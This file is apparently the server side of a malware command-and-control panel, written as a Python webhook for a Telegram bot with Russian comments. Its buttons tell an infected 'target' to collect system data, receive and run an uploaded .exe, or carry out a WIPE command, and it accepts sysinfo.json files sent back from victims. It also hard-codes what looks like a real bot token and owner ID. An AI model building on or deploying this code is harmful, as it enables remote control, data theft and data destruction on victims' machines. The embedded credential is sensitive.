# api/webhook.py
from http.server import BaseHTTPRequestHandler
import json
import os
import urllib.request

BOT_TOKEN = "8952329039:AAFWRXYh5NuVKoSOnprkqrBq7TjcV_U7a-Y"
OWNER_ID = 8239419486
TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"


def tg(method, payload):
    """Отправить запрос в Telegram API"""
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        f"{TG_API}/{method}",
        data=data,
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read())
    except Exception as e:
        return {"ok": False, "error": str(e)}


def send_message(chat_id, text, reply_markup=None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    return tg("sendMessage", payload)


def main_menu():
    return {
        "inline_keyboard": [
            [{"text": "📊 Собрать данные", "callback_data": "collect"}],
            [{"text": "🚀 Запустить файл", "callback_data": "upload"}],
            [{"text": "💣 Стереть все вирусы", "callback_data": "wipe"}],
            [{"text": "ℹ️ Статус", "callback_data": "status"}],
        ]
    }


def handle_update(update):
    """Обработка одного апдейта от Telegram"""
    # Проверка владельца
    from_id = None
    if "message" in update:
        from_id = update["message"].get("from", {}).get("id")
    elif "callback_query" in update:
        from_id = update["callback_query"].get("from", {}).get("id")

    if from_id != OWNER_ID:
        return

    # Обработка сообщений
    if "message" in update:
        msg = update["message"]
        text = msg.get("text", "")

        if text == "/start":
            send_message(OWNER_ID, "🖥 *C2 Panel*\n\nВыбери действие:", main_menu())

        # Приём sysinfo.json
        if "document" in msg:
            doc = msg["document"]
            if doc.get("file_name") == "sysinfo.json":
                send_message(OWNER_ID, f"📥 Получен sysinfo.json ({doc.get('file_size', 0)} байт)")

    # Обработка кнопок
    if "callback_query" in update:
        q = update["callback_query"]
        qid = q["id"]
        data = q.get("data", "")

        # Подтверждаем нажатие
        tg("answerCallbackQuery", {"callback_query_id": qid})

        if data == "collect":
            send_message(OWNER_ID, "⏳ *Сбор данных...*\nЖдём ответа от цели (≤30 сек).")

        elif data == "upload":
            send_message(OWNER_ID, "📤 *Запуск файла на цели*\n\nОтправь `.exe` — бот передаст его вирусу.")

        elif data == "wipe":
            # Пишем WIPE в чат — вирус прочитает через getUpdates
            tg("sendMessage", {"chat_id": OWNER_ID, "text": "WIPE"})
            send_message(OWNER_ID, "💣 *Команда WIPE отправлена.*\n\nЦель выполнит при следующем тике.")

        elif data == "status":
            send_message(OWNER_ID, f"📡 *C2 online*\n\nOwner ID: `{OWNER_ID}`")


class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length)
            update = json.loads(body)
            handle_update(update)
        except Exception as e:
            print(f"Error: {e}")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_GET(self):
        # Health check
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"C2 online")